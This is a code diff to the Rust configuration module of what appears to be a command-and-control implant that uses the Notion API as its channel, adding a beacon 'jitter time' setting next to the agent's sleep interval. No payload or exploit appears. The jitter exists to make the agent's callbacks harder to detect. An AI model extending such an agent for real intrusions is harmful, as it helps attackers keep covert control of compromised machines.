@@ -10,6 +10,7 @@ pub const URL_BASE: &str = "https://api.notion.com/v1";
 pub const DEFAULT_API_KEY: &str = "<<API_KEY>>";
 pub const DEFAULT_PARENT_PAGE_ID: &str = "<<PARENT_PAGE_ID>>";
 pub const DEFAULT_SLEEP_INTERVAL: &str = "<<SLEEP>>";
+pub const DEFAULT_JITTER_TIME: &str = "<<JITTER>>";
 
 #[cfg(windows)]
 pub const CONFIG_FILE_PATH: &str = "C:\\ProgramData\\cfg.json";
@@ -31,6 +32,7 @@ pub const CONFIG_FILE_PATH: &str = "./cfg.json";
 #[derive(Debug, Serialize)]
 pub struct ConfigOptions {
     pub sleep_interval: u64,
+    pub jitter_time: u64,
     pub parent_page_id: String,
     pub api_key: String,
     pub config_file_path: String
@@ -54,6 +56,7 @@ impl ConfigOptions {
         println!("{:?}", j);
         ConfigOptions {
             sleep_interval: j["sleep_interval"].as_u64().unwrap(),
+            jitter_time: j["jitter_time"].as_u64().unwrap(),
             parent_page_id: j["parent_page_id"].to_string().replace('"', ""),
             api_key: j["api_key"].to_string().replace('"', ""),
             config_file_path: j["config_file_path"].to_string().replace('"', "")
@@ -75,6 +78,11 @@ pub fn get_config_options_debug() -> Result<ConfigOptions, Box<dyn Error + Send 
     io::stdout().flush()?;
     stdin.read_line(&mut sleep_interval)?;
 
+    let mut jitter_time = String::new();
+    print!("[*] Enter agent jitter time > ");
+    io::stdout().flush()?;
+    stdin.read_line(&mut jitter_time)?;
+
     let mut parent_page_id = String::new();
     print!("[*] Enter parent page id > ");
     io::stdout().flush()?;
@@ -93,6 +101,7 @@ pub fn get_config_options_debug() -> Result<ConfigOptions, Box<dyn Error + Send 
     Ok(
         ConfigOptions {
             sleep_interval: sleep_interval.trim().parse().unwrap(),
+            jitter_time: jitter_time.trim().parse().unwrap(),
             parent_page_id: parent_page_id.trim().to_string(),
             api_key: api_key.trim().to_string(),
             config_file_path: config_file_path.trim().to_string()
@@ -103,7 +112,8 @@ pub fn get_config_options_debug() -> Result<ConfigOptions, Box<dyn Error + Send 
 /// Sets default config options from defined constants.
 pub async fn get_config_options() -> Result<ConfigOptions, ConfigError> {
     let config_options = ConfigOptions {
-        sleep_interval: DEFAULT_SLEEP_INTERVAL.parse().unwrap(),
+        sleep_interval: DEFAULT_SLEEP_INTERVAL.parse().unwrap_or_else(|_| 10),
+        jitter_time: DEFAULT_JITTER_TIME.parse().unwrap_or_else(|_| 0),
         parent_page_id: DEFAULT_PARENT_PAGE_ID.to_string(),
         api_key: DEFAULT_API_KEY.to_string(),
         config_file_path: CONFIG_FILE_PATH.to_string()
